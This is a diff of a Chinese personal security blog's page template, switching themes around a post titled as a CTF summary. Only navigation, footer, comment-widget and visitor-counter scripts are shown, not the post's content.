-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <section class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image"
-                src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/images/jesen.jpg"
-                alt="Jesen" />
-            
-              <p class="site-author-name" itemprop="name">Jesen</p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives/#%7C%7C%20archive">
-              
-                  <span class="site-state-item-count">17</span>
-                  <span class="site-state-item-name">日志</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
-                  <span class="site-state-item-name">分类</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
-                  <span class="site-state-item-count">18</span>
-                  <span class="site-state-item-name">标签</span>
-                </a>
-              </div>
-            
-
-          </nav>
-
-          
-
-          
-            <div class="links-of-author motion-element">
-                
-                  <span class="links-of-author-item">
-                    <a href="https://github.com/mrjesen" target="_blank" title="GitHub">
-                      
-                        <i class="fa fa-fw fa-github"></i>GitHub</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="/#暂不公开" target="_blank" title="Telegram">
-                      
-                        <i class="fa fa-fw fa-github"></i>Telegram</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="https://www.zhihu.com/people/xlv5/#" target="_blank" title="知乎">
-                      
-                        <i class="fa fa-fw fa-compass"></i>知乎</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="/#" target="_blank" title="微博">
-                      
-                        <i class="fa fa-fw fa-weibo"></i>微博</a>
-                  </span>
-                
-            </div>
-          
-
-          
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                友情链接
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://www.bugku.com" title="Bugku" target="_blank">Bugku</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://yml-sec.top/" title="yemoli" target="_blank">yemoli</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://www.194nb.com/" title="Aman" target="_blank">Aman</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-
-        </div>
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#个人打CTF的一些总结"><span class="nav-number">1.</span> <span class="nav-text">个人打CTF的一些总结</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Jesen</span>
-
-  
-</div>
-
-
-
-
-
-
-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a></div>
-
-
-
-
-        
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Jesen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://jesen.ddwhm.com/2019/11/11/zongjie.html">http://jesen.ddwhm.com/2019/11/11/zongjie.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2019/11/24/NJUCTF2019.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">NJUCTF2019-部分wp</div></div></a></div><div class="next-post pull-right"><a href="/2019/11/09/hxbctf-2019.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">湖湘杯2019 web1-UNTAR writeup</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/06/17/ciscn-northeast.html" title="2021年东北赛区ciscn分区赛wp"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-17</div><div class="title">2021年东北赛区ciscn分区赛wp</div></div></a></div><div><a href="/2019/11/09/hxbctf-2019.html" title="湖湘杯2019 web1-UNTAR writeup"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-11-09</div><div class="title">湖湘杯2019 web1-UNTAR writeup</div></div></a></div><div><a href="/2019/11/03/RSCTF2019-WEB.html" title="RSCTF2019-WEB"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-11-03</div><div class="title">RSCTF2019-WEB</div></div></a></div><div><a href="/2020/12/27/zongheng-wp.html" title="纵横杯2020-WRITEUP"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-12-27</div><div class="title">纵横杯2020-WRITEUP</div></div></a></div><div><a href="/2020/08/24/qwb2020.html" title="强网杯2020部分writeup"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-24</div><div class="title">强网杯2020部分writeup</div></div></a></div><div><a href="/2020/08/24/ciscncs.html" title="CISCN2020 初赛WEB writeup"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-24</div><div class="title">CISCN2020 初赛WEB writeup</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/images/jesen.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="avatar"/><div class="author-info__name">Jesen</div><div class="author-info__description">想要人前装逼,必须得在人后学习</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">18</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/mrjesen" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">欢迎访问Jesen的博客。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%AA%E4%BA%BA%E6%89%93CTF%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">个人打CTF的一些总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/06/17/ciscn-northeast.html" title="2021年东北赛区ciscn分区赛wp"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="2021年东北赛区ciscn分区赛wp"/></a><div class="content"><a class="title" href="/2021/06/17/ciscn-northeast.html" title="2021年东北赛区ciscn分区赛wp">2021年东北赛区ciscn分区赛wp</a><time datetime="2021-06-17T13:43:36.000Z" title="Created 2021-06-17 21:43:36">2021-06-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/27/zongheng-wp.html" title="纵横杯2020-WRITEUP"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="纵横杯2020-WRITEUP"/></a><div class="content"><a class="title" href="/2020/12/27/zongheng-wp.html" title="纵横杯2020-WRITEUP">纵横杯2020-WRITEUP</a><time datetime="2020-12-27T12:58:25.000Z" title="Created 2020-12-27 20:58:25">2020-12-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/16/RSCTF2020writeup.html" title="RSCTF2020_writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="RSCTF2020_writeup"/></a><div class="content"><a class="title" href="/2020/11/16/RSCTF2020writeup.html" title="RSCTF2020_writeup">RSCTF2020_writeup</a><time datetime="2020-11-16T03:30:17.000Z" title="Created 2020-11-16 11:30:17">2020-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/08/24/qwb2020.html" title="强网杯2020部分writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="强网杯2020部分writeup"/></a><div class="content"><a class="title" href="/2020/08/24/qwb2020.html" title="强网杯2020部分writeup">强网杯2020部分writeup</a><time datetime="2020-08-24T07:59:01.000Z" title="Created 2020-08-24 15:59:01">2020-08-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/08/24/ciscncs.html" title="CISCN2020 初赛WEB writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="CISCN2020 初赛WEB writeup"/></a><div class="content"><a class="title" href="/2020/08/24/ciscncs.html" title="CISCN2020 初赛WEB writeup">CISCN2020 初赛WEB writeup</a><time datetime="2020-08-24T02:37:46.000Z" title="Created 2020-08-24 10:37:46">2020-08-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Jesen</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/utils.js"></script><script src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Just Go Go',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: true,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: true
+    }, null))
   }
-</script>
 
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="//cdn.jsdelivr.net/fastclick/1.0.6/fastclick.min.js"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery.lazyload/1.9.3/jquery.lazyload.min.js"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
-  
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/src/post-details.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-  
-  <script type="text/javascript">
-    var GUEST = ['nick','mail','link'];
-    var guest = 'nick,mail';
-    guest = guest.split(',').filter(item=>{
-      return GUEST.indexOf(item)>-1;
-    });
-    new Valine({
-        el: '#comments' ,
-        verify: false,
-        notify: false,
-        appId: 'SDu2T9KUB8UY5eF5L3dfbdyt-gzGzoHsz',
-        appKey: 'Q4E9nvCrlFLKhPtPLwXlkkxb',
-        placeholder: 'Just go go',
-        avatar:'mm',
-        guest_info:guest,
-        pageSize:'10' || 10,
-    });
-  </script>
-
-
-
-  
-
-
-
-
-
-  
-
-  
-  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
-  <script>AV.initialize("SDu2T9KUB8UY5eF5L3dfbdyt-gzGzoHsz", "Q4E9nvCrlFLKhPtPLwXlkkxb");</script>
-  <script>
-    function showTime(Counter) {
-      var query = new AV.Query(Counter);
-      var entries = [];
-      var $visitors = $(".leancloud_visitors");
-
-      $visitors.each(function () {
-        entries.push( $(this).attr("id").trim() );
-      });
-
-      query.containedIn('url', entries);
-      query.find()
-        .done(function (results) {
-          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
-
-          if (results.length === 0) {
-            $visitors.find(COUNT_CONTAINER_REF).text(0);
-            return;
-          }
-
-          for (var i = 0; i < results.length; i++) {
-            var item = results[i];
-            var url = item.get('url');
-            var time = item.get('time');
-            var element = document.getElementById(url);
-
-            $(element).find(COUNT_CONTAINER_REF).text(time);
-          }
-          for(var i = 0; i < entries.length; i++) {
-            var url = entries[i];
-            var element = document.getElementById(url);
-            var countSpan = $(element).find(COUNT_CONTAINER_REF);
-            if( countSpan.text() == '') {
-              countSpan.text(0);
-            }
-          }
-        })
-        .fail(function (object, error) {
-          console.log("Error: " + error.code + " " + error.message);
-        });
-    }
-
-    function addCount(Counter) {
-      var $visitors = $(".leancloud_visitors");
-      var url = $visitors.attr('id').trim();
-      var title = $visitors.attr('data-flag-title').trim();
-      var query = new AV.Query(Counter);
-
-      query.equalTo("url", url);
-      query.find({
-        success: function(results) {
-          if (results.length > 0) {
-            var counter = results[0];
-            counter.fetchWhenSave(true);
-            counter.increment("time");
-            counter.save(null, {
-              success: function(counter) {
-                var $element = $(document.getElementById(url));
-                $element.find('.leancloud-visitors-count').text(counter.get('time'));
-              },
-              error: function(counter, error) {
-                console.log('Failed to save Visitor num, with error message: ' + error.message);
-              }
-            });
-          } else {
-            var newcounter = new Counter();
-            /* Set ACL */
-            var acl = new AV.ACL();
-            acl.setPublicReadAccess(true);
-            acl.setPublicWriteAccess(true);
-            newcounter.setACL(acl);
-            /* End Set ACL */
-            newcounter.set("title", title);
-            newcounter.set("url", url);
-            newcounter.set("time", 1);
-            newcounter.save(null, {
-              success: function(newcounter) {
-                var $element = $(document.getElementById(url));
-                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
-              },
-              error: function(newcounter, error) {
-                console.log('Failed to create');
-              }
-            });
-          }
-        },
-        error: function(error) {
-          console.log('Error:' + error.code + " " + error.message);
-        }
-      });
-    }
-
-    $(function() {
-      var Counter = AV.Object.extend("Counter");
-      if ($('.leancloud_visitors').length == 1) {
-        addCount(Counter);
-      } else if ($('.post-title-link').length > 1) {
-        showTime(Counter);
-      }
-    });
-  </script>
-
-
-
-  
-
-  
-
-  
-  
-
-  
-
-  
-
-  
-
-</body>
-</html>
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
